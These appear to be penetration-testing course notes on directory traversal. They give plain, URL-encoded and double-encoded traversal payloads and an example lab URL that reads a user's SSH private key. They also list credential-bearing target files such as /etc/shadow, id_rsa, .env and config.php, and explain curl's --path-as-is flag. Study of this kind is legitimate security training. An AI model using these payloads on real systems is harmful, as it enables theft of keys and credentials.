# Module 9 Common Web Application Attacks

---
## 9.1 Directory Travel

```bash
#Use it whenever there is a .php at the end of the url or known dir traversal vuln
../../../../../../your/wanted/path

#Use this when the 1st method is not working '%2e' is encoded '.'
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/your/wanted/path

#Double encoded-variants for stricter filters (%252e)
%252e%252e/%252e%252e/%252e%252e/%252e%252e/your/wanted/path

#Example
http://192.168.247.16/meteor/index.php?page=admin.php?../../../../../../../../../../../../home/offsec/.ssh/id_rsa


```

---


### Important Directories

/etc/passwd             # User accounts and home directories

/etc/shadow             # Hashed passwords (needs root)

/etc/hosts              # Internal hostnames and IPs

/etc/ssh/sshd_config    # SSH config — shows allowed users, port

/home/user/.ssh/id_rsa  # Private SSH keys

/var/log/apache2/access.log  # Web server logs — useful for log poisoning

/var/www/html/config.php     # Web app config — often has DB credentials

/proc/self/environ      # Environment variables — may contain secrets

/.env                   # App environment file — API keys, passwords


---

### Curl path as is

The curl --path-as-is option tells curl to bypass URL path normalization and transmit dot-dot (/../) or dot (/./) sequences directly to the server exactly as written

